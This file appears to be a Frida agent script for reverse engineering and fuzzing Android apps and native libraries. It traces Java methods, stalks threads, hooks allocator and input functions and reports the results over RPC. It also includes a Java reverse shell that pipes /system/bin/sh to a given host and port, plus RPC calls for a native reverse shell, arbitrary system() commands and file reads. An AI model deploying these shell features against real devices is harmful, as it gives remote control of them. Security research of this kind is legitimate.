const threadTrees = new Map();
const threadsHook = {};

/* bantuan untuk hook tree */
class HookNode {
    constructor(name) {
        this.name = name;
        this.count = 0;
        this.addr = null;
        this.children = new Map();
    }
}

function hookGetThread() {
    const tid = Process.getCurrentThreadId();

    if (!threadsHook[tid])
    {
        threadsHook[tid] = {
            root: new HookNode("ROOT"),
            stack: [],
            seenEdges: new Set()
        };
    }

    return threadsHook[tid];
}
/***************************/


/********* FUZZ VAR ***************/
var fuzz_cases = 0;
var fuzz_crashes = 0;
var cov = new Uint8Array(65536);
var virgin = new Uint8Array(65536);
virgin.fill(0xff);
let prev = 0;
let newcov = false;
var out_cov = [];

var stalker_events = new Set(); // hanya data baru
var gc_cnt = 0;
var is_enter = false;
var zbuf = Memory.alloc(0x100);
var func_handle = new NativeFunction(ptr(0x40131a), 'void', ['pointer']);
/**********************************/


/*********** Heap Trace *******************/
const alloc_range = new Map();
var out_traceheap = [];
var is_alloctrace = false;
function findAllocation(addr) {
    for (const [key, alloc] of alloc_range) {
        const start = ptr(alloc.ptr);
        const end = start.add(alloc.size);

        //console.log("       args="+addr+"(start="+start+" - end="+end+")");
        if (addr.compare(start) >= 0 && addr.compare(end) < 0) {
            return alloc;
        }
    }
    return null;
}

/*********** Buffer network input Trace *******************/
var is_buffnetwork = false;

/*********** Buffer input Trace *******************/
var is_buffinput = false;


class FuzzerKu
{
    constructor() {
       this.rpc_setup();
       this.typeLog = "send";
    }

    locateData() {
       const self = this;
       Java.perform(function () {
          var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();

          Java.scheduleOnMainThread(function() {
             var toast = Java.use("android.widget.Toast");
             toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Fuzzer proxy v1.0"), 1).show();
          });

          //var data = context.getApplicationInfo().dataDir;
          //self.pwd = data.value;

          var data = context.getPackageName();
          self.pwd = "/data/data/"+data;
       });
    }

    locatelib() {
       var modulesArray = Process.enumerateModules();
       for (var i=0; i<modulesArray.length; i++)
       {
          if (modulesArray[i].path.indexOf(this.injectedlib) != -1)
          {
             var str = modulesArray[i].path;
             return str.substring(0, str.lastIndexOf("/"))
          }
       }
    }

    sleep(ms) {
        var start = new Date().getTime(), expire = start + ms;
        while (new Date().getTime() < expire) { }
        return;
    }

    logDebug(type, msg, subtype) {
        if (type == "send") {
           if (subtype == "em")
               send({"type": "enum_modules", "log": msg});
           else if (subtype == "es")
               send({"type": "enum_symbols", "log": msg});
           else if (subtype == "et")
               send({"type": "enum_threads", "log": msg});
           else if (subtype == "id_threads")
               send({"type": "id_threads", "log": msg});

           else if (subtype == "hook_hit")
               send({"type": "hook_hit", "log": msg});

           else if (subtype == "hooktree_hit")
               send({"type": "hooktree_hit", "log": msg});

           else if (subtype == "fail_hook_tree")
               send({"type": "fail_hook_tree", "log": msg});


           else if (subtype == "bb_hit")
               send({"type": "bb_hit", "log": msg});


           else if (subtype == "java_hit")
               send({"type": "java_hit", "log": msg});


           else if (subtype == "stalker")
               send({"type": "stalker", "log": msg});

           else if (subtype == "stalker-ct")
               send({"type": "stalker-ct", "log": msg});


           else if (subtype == "bnlog")
               send({"type": "bnlog", "log": msg});

           else if (subtype == "info")
               send({"type": "info", "log": msg});

        }
        else if (type == "console") {
           console.log(msg);
        }
    }

    reverseShellJava(sip, sport) { // server listen: nc -lp 9090
        Java.perform(function () {
           const Socket = Java.use('java.net.Socket');
           const OutputStream = Java.use('java.io.OutputStream');
           const InputStream = Java.use('java.io.InputStream');
           const JavaString = Java.use('java.lang.String');
           const ProcessBuilder = Java.use('java.lang.ProcessBuilder');
           const Thread = Java.use('java.lang.Thread');
           const ArrayList = Java.use('java.util.ArrayList');
           const host = JavaString.$new(sip);
           const port = parseInt(sport);

           console.log("connect to: "+sip)

           var arr = Java.array('java.lang.String', ['/system/bin/sh']);
           var p = ProcessBuilder.$new.overload('[Ljava.lang.String;').call(ProcessBuilder, arr).redirectErrorStream(true).start();
           var s = Socket.$new.overload('java.lang.String', 'int').call(Socket, host, port);

           var pi = p.getInputStream();
           var pe = p.getErrorStream();
           var si = s.getInputStream();

           var po = p.getOutputStream(),
           so = s.getOutputStream();

           var i = 0;
           while(!s.isClosed())
           {
              while(pi.available()>0) {
                so.write(pi.read());
              }
              while(pe.available()>0) {
                so.write(pe.read());
              }
              while(si.available()>0) {
                po.write(si.read());
              }
              so.flush();
              po.flush();

              Thread.sleep(50);
              try {
                p.exitValue();
                break;
              } catch (e){
                // ignore
              }
           }
           p.destroy();
           s.close();
       });
    }

    addrToSymb(summary)
    {
      /* this sample data of summary
         {
            "0x73739255c4": 1,
         }
      */
       var output = []

       for (const addr in summary)
       {
          const cc = summary[addr]
          const sym = DebugSymbol.fromAddress(ptr(addr))
          const module = Process.findModuleByAddress(ptr(addr))

          const out = {
             "addr": addr,
             "call_count": cc,
             "column": sym.column,
             "fileName": sym.fileName,
             "lineNumber": sym.lineNumber,
             "moduleName": sym.moduleName,
             "modulePath": module == null ? "" : module.path,
             "moduleBase": module == null ? "" : module.base,
             "moduleSize": module == null ? "" : module.size,
             "name": sym.name
          };

          output.push(out)
       }
       return output
    }

    stalkingjavaclass(jclass)
    {
        const subthis = this

        console.log("[+] Agent @ Starting.."); //entah kenapa console ini penting

        Java.perform(function() {
            Java.enumerateLoadedClasses({
                onMatch: function(aClass) {
                    if (aClass.match(jclass)) {
                        traceClass(aClass);
                    }
                },
                onComplete: function() {}
            });
        });

        // remove duplicates from array
        function uniqBy(array, key) {
            var seen = {};
            return array.filter(function(item) {
                var k = key(item);
                return seen.hasOwnProperty(k) ? false : (seen[k] = true);
            });
        }

        function traceClass(targetClass) {
            var hook = Java.use(targetClass);
            var methods = hook.class.getDeclaredMethods();

            hook.$dispose;
            var parsedMethods = [];

            methods.forEach(function(method) {
                parsedMethods.push(method.toString().replace(targetClass + ".", "TOKEN").match(/\sTOKEN(.*)\(/)[1]);
            });

            var targets = uniqBy(parsedMethods, JSON.stringify);

            targets.forEach(function(targetMethod) {
                traceMethod(targetClass + "." + targetMethod);
            });
        }

        // trace a specific Java Method
        function traceMethod(targetClassMethod) {
            var delim = targetClassMethod.lastIndexOf(".");

            if (delim === -1) return;

            var targetClass = targetClassMethod.slice(0, delim)
            var targetMethod = targetClassMethod.slice(delim + 1, targetClassMethod.length)
            var hook = Java.use(targetClass);
            var overloadCount;

            try {
                overloadCount = hook[targetMethod].overloads.length;
            } catch (e){
                console.log(e)
            }

            //subthis.logDebug("send", "Hooking: "+targetClassMethod+" >> ["+overloadCount+"]", "info");
            console.log("Hooking: " + targetClassMethod + " [" + overloadCount + " overload(s)]");

            for (var i=0; i<overloadCount; i++) {
                hook[targetMethod].overloads[i].implementation = function() {
                    //console.warn("\n*** entered " + targetClassMethod);

                    var output = {}


                    output["classMethod"] = targetClassMethod

                    Java.perform(function() {
                        var bt = Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new());
                        output["backtrace"] = bt
                    });

                    var out_arg = []
                    for (var j=0; j<arguments.length; j++) {
                        const myarg = arguments[j] ? arguments[j].toString() : "null";

                        out_arg.push("arg[" + j + "]: " + myarg);
                    }
                    output["arg"] = out_arg

                    var retval = this[targetMethod].apply(this, arguments); // rare crash (Frida bug?)
                    output["retval"] = retval ? retval.toString() : "null"

                    subthis.logDebug("send", output, "java_hit");

                    return retval;
                }
            }
        }
    }
    stalkingfuncbymodule(module) {
        console.log("[+] Agent @ stalking => "+module);

        //filter
        const TARGET_MODULES = module.split(",");
        const TARGET_RANGES = TARGET_MODULES.map(name => {
          const m = Process.getModuleByName(name);
          return {
            name: m.name,
            base: m.base,
            end:  m.base.add(m.size)
          };
        });
        function inTargetRanges(addr) {
          for (const r of TARGET_RANGES) {
            if (addr.compare(r.base) >= 0 && addr.compare(r.end) < 0)
              return r;
          }
          return null;
        }


        //stalker
        const stalked = new Set();
        Stalker.trustThreshold = 0;

        function makeNode(addr) {
           const sym = DebugSymbol.fromAddress(addr);
           //name: sym && sym.name ? sym.name : addr.toString(),
           return {
              name_addrs: sym,
              addr: addr.toString(),
              children: []
           };
        }


        function stalkAllThreads(tid) {
          if (stalked.has(tid))
            return;

          stalked.add(tid);
          //console.log("[+] Stalking thread ", tid);

          const tree = {
             tid: tid,
             root: [],
             stack: []
          };
          threadTrees.set(tid, tree);


          Stalker.follow(tid, {
            events: { call: true, ret: true },

            onReceive(events) {
              const parsed = Stalker.parse(events);

              parsed.forEach(ev => {
                if (ev[0] === "call") {

                  const to = ptr(ev[2]);
                  const range = inTargetRanges(to);

                  const node = makeNode(to);

                  if (range) {
                     if (tree.stack.length === 0)
                         tree.root.push(node);
                     else
                         tree.stack[tree.stack.length-1].children.push(node);
                  }
                  tree.stack.push(node);
                }
                else if (ev[0] === "ret") {
                  if (tree.stack.length > 0)
                     tree.stack.pop()
                }
              });
            }

          });
        }

        setInterval(() => {
           //console.log("====");

           Process.enumerateThreads({
              onMatch(thread) {
                 stalkAllThreads(thread.id);
              },
              onComplete() {}
           });
           //const arr = Array.from(threadTrees);

           //send({"type": "stalker-data", "data": "sd" });


          //DEBUG
          /*threadTrees.forEach((z) => {
             //console.log(JSON.stringify(z))
             console.log("tid: "+z.tid+" rootL:"+z.root.length);
          });*/
        }, 1000);
    }

    stalkingfunc(addr, filter)
    {
        console.log("[+] Agent @ Done."); //entah kenapa console ini penting

        const subthis = this

        Interceptor.attach(addr, {
            onEnter(args) {
                const sym = DebugSymbol.fromAddress(addr)

                this.hook_output = {}
                this.hook_output["argumen"] = "";
                try {
                    this.hook_output["argumen"] = "args[0]: "+Memory.readCString(ptr(args[0]));
                }catch(e){}

                this.hook_output["backtrace"] = Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n");
                this.hook_output["func_name"] = sym.name
                this.hook_output["func_addr"] = sym.address


                /* filter modules */
                var whitelist = ["all"]; //["libc.so", "libs.so"...]

                const filtered_maps = new ModuleMap(function (m) {
                    if (whitelist.indexOf('all') >= 0) {
                        return true;
                    }
                    return whitelist.indexOf(m.name) >= 0;
                });

                /* block */
                if (filter == "zsetup_block")
                {
                    Stalker.follow(this.threadId, {
                        events: {
                            compile: true
                        },
                        onReceive: function (events) {
                            var bbs = Stalker.parse(events, {
                                stringify: false,
                                annotate: false
                            });

                            for (var i=0; i<bbs.length; i++) {
                                //console.log(""+i+": "+bbs[i])

                                /* bbs[i][0] = first bb
                                 * bbs[i][1] = last bb
                                */
                                const outbb = bbs[i][0]
                                const out = [outbb, sym.name]

                                const cek = filtered_maps.findPath(outbb);
                                if (cek == null) { continue; }

                                subthis.logDebug("send", out, "bb_hit");
                            }
                        }
                    });
                    return
                }

                /* intruction */
                Stalker.follow(this.threadId, {
                    transform: function(iterator) {
                        let instruction = iterator.next();
                        do {
                            if (filter == "all") {
                                subthis.logDebug("send", instruction, "bnlog");
                            }
                            else {
                                if (instruction.mnemonic == filter) {
                                    iterator.putCallout(printRet);
                                }
                            }
                            iterator.keep();
                        } while ((instruction = iterator.next()) !== null);
                    },

                });
            },
            onLeave(retval) {
               Stalker.unfollow(this.threadId);

               this.hook_output["retval"] = retval
               subthis.logDebug("send", this.hook_output, "hook_hit");
            }
        });

        function printRet(context) {
            //console.log(filter+' @ ' + context.pc);
            subthis.logDebug("send", filter+" @ "+context.pc, "bnlog");
        }
    }

    // sink for buff_input network
    setup_sink_buffinput_network() {
        const subthis = this;

        Interceptor.attach(Module.findExportByName(null, "recvfrom"), {
            onEnter(args) {
                this.output = {}
                //     ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
                //        struct sockaddr *src_addr, socklen_t *addrlen);

                this.sockfd = args[0].toInt32();
                this.buf = args[1].toString();
                this.size = args[2].toInt32();
                this.flags = args[3].toInt32();
                this.src_addr = args[4].toString();
                this.addr_len = args[5].toString();

                /*
                alloc_range.set(this.buf, {
                    ptr: this.buf,
                    size: this.size
                });*/
                console.log(
                    `[recvfrom] buf=${this.buf} size=${this.size} flags=${this.flags} fd=${this.sockfd}`
                );
            },
            onLeave(retval) {
                //jika crash comment ini
                /*this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                const caller = DebugSymbol.fromAddress(this.returnAddress);
                this.output["retval"] = retval;
                this.output["key"] = this.buf;
                this.output["func_name"] = "recv||caller_"+caller+"||"+this.size;
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).addres;
                this.output["member"] = [];
                send({"type": "inputbuffer_network_hit", "log": this.output});*/
            }
        });

        Interceptor.attach(Module.findExportByName(null, "recv"), {
            onEnter(args) {
                this.output = {}
                // ssize_t recv(int sockfd, void *buf, size_t len, int flags);
                this.sockfd = args[0].toInt32();
                this.buf = args[1].toString();
                this.size = args[2].toInt32();
                this.flags = args[3].toInt32();

                alloc_range.set(this.buf, {
                    ptr: this.buf,
                    size: this.size
                });
                console.log(
                    `[recv] buf=${this.buf} size=${this.size} flags=${this.flags} fd=${this.fd}`
                );
            },
            onLeave(retval) {
                //jika crash comment ini
                this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                const caller = DebugSymbol.fromAddress(this.returnAddress);
                this.output["retval"] = retval;
                this.output["key"] = this.buf;
                this.output["func_name"] = "recv||"+caller+"||"+this.size;
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).addres;
                this.output["member"] = [];
                send({"type": "inputbuffer_network_hit", "log": this.output});
            }
        });
    }

    // sink for buff_input
    setup_sink_buffinput() {
        const subthis = this;

        Interceptor.attach(Module.findExportByName(null, "fread"), {
            onEnter(args) {
                this.output = {}
                //(void *ptr, size_t size, size_t nmemb, FILE *stream);
                this.buf = args[0].toString();
                this.size = args[1].toInt32();
                this.nmemb = args[2].toInt32();
                this.fd = args[3].toInt32();

                alloc_range.set(this.buf, {
                    ptr: this.buf,
                    size: this.size
                });

                /*console.log(
                    `[fread] buf=${this.buf} size=${this.size} nmemb=${this.nmemb} fd=${this.fd}`
                );*/
            },
            onLeave(retval) {
                //jika crash comment ini
                this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                const caller = DebugSymbol.fromAddress(this.returnAddress);
                this.output["retval"] = retval;
                this.output["key"] = this.buf;
                this.output["func_name"] = "fread||"+caller+"||"+this.size;
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).addres;
                this.output["member"] = [];
                send({"type": "inputbuffer_hit", "log": this.output});
            }
        });

        /*
        Interceptor.attach(Module.findExportByName(null, "fgets"), {
            onEnter(args) {
                this.output = {}

                console.log("enter fgets");
                this.fd = args[0].toInt32();
                this.buf = args[1].toString();
                this.size = args[2].toInt32();

                alloc_range.set(this.buf, {
                    ptr: this.buf,
                    size: this.size
                });
                console.log(
                    `[read] fgets=${this.fd} buf=${this.buf} size=${this.size}`
                );
            },
            onLeave(retval) {
            }
        });*/

        /* Gak tau kenapa tidak terhit
        Interceptor.attach(Module.findExportByName(null, "read"), {
            onEnter(args) {
                this.output = {}

                this.fd = args[0].toInt32();
                this.buf = args[1].toString();
                this.size = args[2].toInt32();

                alloc_range.set(this.buf, {
                    ptr: this.buf,
                    size: this.size
                });
                console.log(
                    `[read] fd=${this.fd} buf=${this.buf} size=${this.size}`
                );

                this.backtrace = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)

                    .join("\n");
            },
            onLeave(retval) {
                const caller = DebugSymbol.fromAddress(this.returnAddress);
                //jika crash comment ini
                this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                this.output["retval"] = retval;
                this.output["key"] = retval;
                this.output["func_name"] = "malloc.caller_"+caller+"."+this.size;
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).addres;
                this.output["member"] = [];
                send({"type": "allochook_hit", "log": this.output});
            }
        });*/
    }

    // sink for allocator
    setup_hookallocator() {
        const subthis = this;
        out_traceheap = [];

        Interceptor.attach(Module.findExportByName(null, "malloc"), {
            onEnter(args) {
                this.output = {}

                this.size = args[0].toInt32();
            },
            onLeave(retval) {
                alloc_range.set(retval.toString(), {
                    ptr: retval.toString(),
                    size: this.size
                });
                console.log(
                    `[malloc] ${retval} size=${this.size}`
                );

                //jika crash comment ini
                this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                const caller = DebugSymbol.fromAddress(this.returnAddress);
                this.output["retval"] = retval;
                this.output["key"] = "malloc_"+retval;
                this.output["func_name"] = "malloc||"+caller+"||"+this.size;
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).addres;
                this.output["member"] = [];

                out_traceheap.push(this.output);
            }
        });
        Interceptor.attach(Module.findExportByName(null, "free"), {
            onEnter(args) {
                alloc_range.delete(args[0].toString());
                console.log(
                    `[free] ${args[0]}`
                );
                this.output = {}

                //jika crash comment ini
                this.output["backtrace"] = Thread.backtrace(
                    this.context,
                    Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                    .join("\n");

                const caller = DebugSymbol.fromAddress(this.returnAddress);
                this.output["func_name"] = "free||"+caller+"||-";
                this.output["func_addr"] = DebugSymbol.fromAddress(this.context.pc).address;
                this.output["key"] = "free_"+args[0].toString();

                out_traceheap.push(this.output);
            }
        });
    }

    onenter_hook2tree(name, addr) {
        const t = hookGetThread();

        let parent;

        if (t.stack.length === 0)
           parent = t.root;
        else
           parent = t.stack[t.stack.length - 1];

        let node;

        if (!parent.children.has(name)) {
           node = new HookNode(name);
           parent.children.set(name, node);
        }
        else {
           node = parent.children.get(name);
        }

        node.count++;
        node.addr = addr;

        const edge = parent.name + "->" + name;

        // kirim hanya jika edge baru
        if (!t.seenEdges.has(edge))
        {/*
            const data = {
                thread: Process.getCurrentThreadId(),
                parent: parent.name,
                child: name,
                addr: addr,
                depth: t.stack.length,
                count: node.count
            }
            this.logDebug("send", data, "hooktree_hit");*/

            t.seenEdges.add(edge);
        }

        t.stack.push(node);
    }


    rpc_setup()
    {
        rpc.exports = {
            enummodules: () => {
               this.logDebug("send", "Agent @ Getting modules...", "info");

               const output = Process.enumerateModulesSync();

               this.logDebug("send", output, "em");
            },
            enumsymbols: (module) => {
               this.logDebug("send", "Agent @ Getting symbols...", "info");
               const output = Module.enumerateSymbols(module)

               this.logDebug("send", output, "es");
            },
            enumthreads: () => {
               this.logDebug("send", "Agent @ Getting thread...", "info");
               const output = Process.enumerateThreadsSync()

               this.logDebug("send", output, "et");
            },
            enumsymbolstrace: (module, sw) => {
               this.logDebug("send", "Agent @ Getting symbols to hook...", "info");

               let dick_sym;

               if (sw == "s")
                   dick_sym = Module.enumerateSymbolsSync(module)
               else if (sw == "i")
                   dick_sym = Module.enumerateImportsSync(module)
               else if (sw == "e")
                   dick_sym = Module.enumerateExportsSync(module)

               return dick_sym

            },
            enumjavaclass: (jclass) => {
               this.logDebug("send", "Agent @ Getting symbols to hook...", "info");

               this.stalkingjavaclass(jclass)
            },
            gethooknodes: () => {
                function serializeNode(node) {
                    const children = {};

                    for (const [name, child] of node.children) {
                        children[name] = serializeNode(child);
                    }

                    return {
                        name: node.name,
                        count: node.count,
                        addr: node.addr,
                        children: children
                    };
                }
                const out = {};

                for (const tid in threadsHook) {
                    const t = threadsHook[tid];

                    out[tid] = {
                        root: serializeNode(t.root),
                        stack_depth: t.stack.length,
                        seen_edges: t.seenEdges.size
                    };
                }
                //console.log(JSON.stringify(out))
                return out;
            },
            idthreads: () => {

               const aa = Process.enumerateThreadsSync()

               var output = []

               //remove context/register data
               for (const key in aa)
               {
                  const id = aa[key]["id"];
                  const state = aa[key]["state"];
                  const name = aa[key]["name"];

                  const out = {
                     "id": id,
                     "state": state,
                     "name": name
                  };

                  output.push(out)
               }

               this.logDebug("send", output, "id_threads");
            },
            getstalkerdata: (tid_func) => {
               if (tid_func == "req_clean") {
                  threadTrees.clear();
                  return
               }
               let out = []

               threadTrees.forEach((z) => {

                  if (tid_func == z.tid) {
                     const data = {
                        "tid": z.tid,
                        "root": z.root,
                        "root_len": z.root.length
                     };
                     out.push(data);
                  }
                  else {
                     const data = {
                        "tid": z.tid,
                        "root": -1,
                        "root_len": z.root.length
                     };
                     out.push(data);
                  }

                  //out.push("tid: "+z.tid+" root:"+z.root.length);
               });

               return out
               //return Array.from(threadTrees);
            },
            setstalker: (sw, id, filter) => {
               if (sw == "intruksi") {
                  if (filter == "") {
                      this.logDebug("send", "Agent @ Setup Stalker addr: "+id, "info");

                      this.stalkingfunc(ptr(id), "all")
                  }
                  else {
                      this.logDebug("send", "Agent @ Setup Stalker addr: "+id+" with filter: "+filter, "info");

                      this.stalkingfunc(ptr(id), filter)
                  }

                  return
               }
               else if (sw == "module") {
                  this.logDebug("send", "Agent @ Setup Stalker module: "+id);
                  this.stalkingfuncbymodule(id);

                  return
               }
               else if (sw == "exit") {
                  Stalker.unfollow(id);
                  return
               }

               this.logDebug("send", "Agent @ Setup Stalker...", "info");
               const subthis = this
               Stalker.trustThreshold = 0;

               //call tree
               if (sw == "ct") {
                  Stalker.follow(id, {
                     events: {
                        call: true,
                        ret: false,
                        exec: false,
                        block: false,
                        compile: false,
                     },
                     onReceive: function (events) {
                        var calls = Stalker.parse(events, {
                           annotate: true,
                        });
                        for (var i=0; i<calls.length; i++) {
                           let call = calls[i][2];

                           var summary = {};
                           summary[call] = 1;

                           const mod_summary = subthis.addrToSymb(summary)

                           subthis.logDebug("send", mod_summary, "stalker-ct");
                        }
                     }
                  });
                  return
               }

               // call count
               Stalker.follow(id, {
                  events: {
                     call: true,
                     ret: false,
                     exec: false,
                     block: false,
                     compile: false,
                  },
                  onCallSummary: function (summary) { //only function call
                     const mod_summary = subthis.addrToSymb(summary)

                     subthis.logDebug("send", mod_summary, "stalker");
                  }
               });
            },
            getalloctrace: () => {
                return out_traceheap;
            },
            getfuzz: () => {
                const outfuzz = {
                    "fuzz_cases": fuzz_cases,
                    "fuzz_crashes": fuzz_crashes,
                    "coverage": stalker_events.size,
                    "is_enter": is_enter
                };
                return outfuzz;
            },
            setfuzz: (start, end) => {
                const target_module = "test";
                const MAP_SIZE = 65536;
                const thread_id = Process.getCurrentThreadId();
                var prev_loc_map = {};
                var prev_loc_ptr = prev_loc_map[thread_id];
                var trace_bits  = Memory.alloc(MAP_SIZE);
                var virgin_bits = Memory.alloc(MAP_SIZE);
                var start_addr = ptr(0);
                var end_addr = ptr("-1");

                for (var i=0; i<MAP_SIZE; i+=4)
                    virgin_bits.add(i).writeU32(0xffffffff);

                prev_loc_ptr = Memory.alloc(32);

                var maps = function() {
                    var maps = Process.enumerateModules();
                    var i = 0;
                    maps.map(function(o) { o.id = i++; });
                    maps.map(function(o) { o.end = o.base.add(o.size); });
                    return maps;
                }();

                if (target_module !== null) {
                    maps.forEach(function(m) {
                      if (m.name == target_module || m == target_module) {
                        start_addr = m.base;
                        end_addr = m.end;
                      } else {
                        Stalker.exclude(m);
                      }
                    });
                } else {
                    maps.forEach(function(m) {
                        if (m.name.startsWith("libc.") || m.name.startsWith("libSystem.") || m.name.startsWith("frida")) {
                            Stalker.exclude(m);
                        }
                    });
                }

                Stalker.trustThreshold = 0;
                /*Stalker.follow(thread_id, {
                  events: {
                      call: false,
                      ret: false,
                      exec: false,
                      block: false,
                      compile: true
                  },
                  transform: __cm.transform,
                });*/

                const stalker_event_config = {
                    call: false,
                    ret: false,
                    exec: false,
                    block: false,
                    compile: true,
                };

                Module.load("/media/jin/4abb279b-6d65-4663-97c2-26987f64673a/home/yuna/LabTes/frida-template/build/frida-template.so");
                const xtransform = DebugSymbol.fromName("xtransform");

                console.log("sdszzzzzzzzzzzzz: "+xtransform.address);
                Stalker.follow(thread_id, {
                    events: stalker_event_config,
                    transform: xtransform.address,
                });

                const target_function = ptr(start)
            },
            setuphook: (func_data, fstalking) => {

               if (fstalking == "detach-all") {
                   is_alloctrace = false;
                   is_buffinput = false;
                   is_buffnetwork = false;
                   this.logDebug("send", "Agent @ Cleaning hook instrument...", "info");
                   Interceptor.detachAll();
                   return
               }

               // Setup hook network input sink buffer
               if (fstalking == "buffnetwork") {
                    is_buffnetwork = true;
                    this.setup_sink_buffinput_network();
                    return;
               }

               // Setup hook input sink buffer
               if (fstalking == "buffinput") {
                    is_buffinput = true;
                    this.setup_sink_buffinput();
                    return;
               }

               // Setup allocator hook
               if (fstalking == "allocator") {
                    is_alloctrace = true;
                    this.setup_hookallocator();
                    return;
               }

               const subthis = this;
               const addr = ptr(func_data.address);

               if (fstalking != -1) {
                   if (fstalking == -2) {
                        this.logDebug("send", "Agent @ Setup hook-tree UI: "+func_data.name+"", "info");

                        try {
                          Interceptor.attach(addr, {
                              onEnter(args) {
                                  subthis.onenter_hook2tree(func_data.name, addr);
                              },
                              onLeave(retval) {
                                  const t = hookGetThread();
                                  t.stack.pop();
                              }
                          });
                        }
                        catch(e){
                          const data = {
                             "name": func_data.name,
                             "addr": addr,
                             "err": e
                          }
                          this.logDebug("send", data, "fail_hook_tree");
                        }
                        return
                   }
                   this.logDebug("send", "Agent @ Setup hook: "+func_data.name+" with stalking: "+fstalking, "info");
                   this.stalkingfunc(addr, fstalking)
               }
               else {
                   this.logDebug("send", "Agent @ Setup hook: "+func_data.name, "info");
                   Interceptor.attach(addr, {
                       onEnter: function(args) {
                           //argument is debug mode
                           this.output = {}
                           this.output["argumen"] = "none";
                           this.output["backtrace"] = "none"

                           try {
                               this.output["argumen"] = "args[0]: "+
                                    Memory.readCString(ptr(args[0]));
                           }catch(e){
                               this.output["argumen"] = ""+e;
                           }
                           //jika crash comment ini
                           this.output["backtrace"] = Thread.backtrace(
                                this.context,
                                Backtracer.ACCURATE).map(DebugSymbol.fromAddress)
                                .join("\n");

                           if (is_buffnetwork) {
                                // jumlah paramater target

                                //console.log("proc: "+func_data.name);
                                for (let i=0; i<6; i++) {
                                    try {
                                        const func_args = findAllocation(args[i]);

                                        if (func_args) {
                                            this.output["buff_network_area"] =
                                                 "args["+i+"] "+
                                                 func_data.name+
                                                 " -> "+func_args.ptr;
                                            //console.log(`${func_data.name} arg${i} -> ${func_args.ptr}`);
                                        }
                                    } catch (_) {}
                                }
                           }

                           if (is_buffinput) {
                                // jumlah paramater target

                                //console.log("proc: "+func_data.name);
                                for (let i=0; i<6; i++) {
                                    try {
                                        const func_args = findAllocation(args[i]);

                                        if (func_args) {
                                            this.output["buff_area"] =
                                                 "args["+i+"] "+
                                                 func_data.name+
                                                 " -> "+func_args.ptr;
                                            //console.log(`${func_data.name} arg${i} -> ${func_args.ptr}`);
                                        }
                                    } catch (_) {}
                                }
                           }

                           if (is_alloctrace) {
                                // jumlah paramater target
                                for (let i=0; i<6; i++) {
                                    try {
                                        const alloc = findAllocation(args[i]);

                                        if (alloc) {
                                            this.output["heap_area"] =
                                                 "args["+i+"] "+
                                                 func_data.name+
                                                 " -> "+alloc.ptr;
                                            //console.log(`${func_data.name} arg${i} -> ${alloc.ptr}`);
                                        }
                                    } catch (_) {}
                                }
                           }
                       },
                       onLeave: function(retval) {
                           this.output["retval"] = retval
                           this.output["func_name"] = func_data.name
                           this.output["func_addr"] = func_data.address

                           subthis.logDebug("send", this.output, "hook_hit");
                       }
                   });
               }

            },
            getbase: (xlib) => {
               const lib = xlib.split(".txt")

               try{
                   return Module.getBaseAddress(lib[0])
               } catch(e) {
                   return -1
               }
            },
            reshelljava: (sip, sport) => {
               this.reverseShellJava(sip, sport);
            },
            reshell: (sip, sport, sbin) => {
               const rshellAddr = DebugSymbol.fromName("reverse_shell").address;
               const rshell = new NativeFunction(rshellAddr, "void", ["pointer", "pointer", "int"]);
               const ip = Memory.allocUtf8String(sip);
               const bin = Memory.allocUtf8String(sbin);
               const port = parseInt(sport);

               rshell(ip, bin, port);
               return "[JS] fork shell created.";
            },
            shell: (cmd) => {
               const systemAddr = DebugSymbol.fromName("system").address;
               const system = new NativeFunction(systemAddr, "pointer", ["pointer"]);
               const syscmd = Memory.allocUtf8String(cmd);
               system(syscmd);

               return 0;
            },
            readtext: (pathname_raw) => {
               const read_textAddr = DebugSymbol.fromName("read_text").address;
               const read_text = new NativeFunction(read_textAddr, "pointer", ["pointer"]);
               const pathname = Memory.allocUtf8String(pathname_raw);

               return read_text(pathname).readCString();
            }
        };
    }

}

const f = new FuzzerKu();
rpc.exports.fuzzer = f;
